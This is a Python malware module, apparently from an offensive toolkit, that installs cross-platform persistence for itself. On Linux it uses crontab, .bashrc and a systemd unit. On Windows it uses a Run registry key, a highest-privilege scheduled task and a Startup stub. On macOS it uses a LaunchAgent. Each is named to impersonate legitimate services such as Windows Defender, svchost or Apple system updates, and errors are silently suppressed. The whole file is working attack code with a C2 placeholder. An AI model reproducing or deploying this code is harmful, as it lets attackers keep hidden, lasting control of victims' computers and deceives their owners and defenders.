#!/usr/bin/env python3
"""
payloads/persistence.py — Persistence multi-plateforme
Linux : crontab + bashrc + systemd
Windows : registre + schtasks + startup
macOS : LaunchAgent
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, sys, platform, pathlib, subprocess

C2   = "FILL_C2_URL"
SELF = os.path.abspath(__file__)
PY   = ("pythonw"
        if platform.system() == "Windows"
        else "python3")
CMD  = f"{PY} {SELF}"
plat = platform.system()

if plat == "Linux":
    # crontab
    subprocess.run(
        f'(crontab -l 2>/dev/null; '
        f'echo "@reboot {CMD}") | crontab -',
        shell=True, capture_output=True,
    )
    # bashrc
    bashrc  = pathlib.Path.home() / ".bashrc"
    marker  = f"# fl_{os.path.basename(SELF)}"
    try:
        content = bashrc.read_text(errors="ignore")
        if marker not in content:
            with open(bashrc, "a") as f:
                f.write(f"\n{marker}\n({CMD} &)\n")
    except Exception:
        pass
    # systemd user unit
    try:
        ud = pathlib.Path.home() / \
             ".config/systemd/user"
        ud.mkdir(parents=True, exist_ok=True)
        (ud / "fl-update.service").write_text(
            f"[Unit]\nDescription=System Update\n"
            f"After=network.target\n\n"
            f"[Service]\nExecStart={CMD}\n"
            f"Restart=always\nRestartSec=30\n\n"
            f"[Install]\nWantedBy=default.target\n"
        )
        subprocess.run(
            "systemctl --user enable "
            "fl-update.service 2>/dev/null",
            shell=True, capture_output=True,
        )
    except Exception:
        pass

elif plat == "Windows":
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows"
            r"\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            key, "WindowsDefenderHelper",
            0, winreg.REG_SZ,
            f"pythonw {SELF}"
        )
        winreg.CloseKey(key)
    except Exception:
        pass
    try:
        subprocess.run(
            f'schtasks /create /sc onlogon '
            f'/tn "WindowsDefenderSvc" '
            f'/tr "pythonw {SELF}" /f /rl highest',
            shell=True, capture_output=True,
        )
    except Exception:
        pass
    try:
        startup = pathlib.Path(
            os.environ.get("APPDATA","")
        ) / ("Microsoft/Windows/Start Menu"
             "/Programs/Startup")
        if startup.exists():
            stub = startup / "svchost_fl.pyw"
            stub.write_text(
                f"import subprocess\n"
                f"subprocess.Popen("
                f"['pythonw',r'{SELF}'],"
                f"creationflags=0x08000000)\n"
            )
    except Exception:
        pass

elif plat == "Darwin":
    try:
        la = pathlib.Path.home() / \
             "Library/LaunchAgents" / \
             "com.apple.sysupdate.helper.plist"
        la.parent.mkdir(parents=True, exist_ok=True)
        la.write_text(
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE plist PUBLIC '
            f'"-//Apple//DTD PLIST 1.0//EN" "">\n'
            f'<plist version="1.0"><dict>\n'
            f'<key>Label</key>'
            f'<string>com.apple.sysupdate.helper'
            f'</string>\n'
            f'<key>ProgramArguments</key><array>\n'
            f'<string>python3</string>'
            f'<string>{SELF}</string></array>\n'
            f'<key>RunAtLoad</key><true/>\n'
            f'<key>KeepAlive</key><true/>\n'
            f'</dict></plist>\n'
        )
        subprocess.run(
            f"launchctl load {la}",
            shell=True, capture_output=True,
        )
    except Exception:
        pass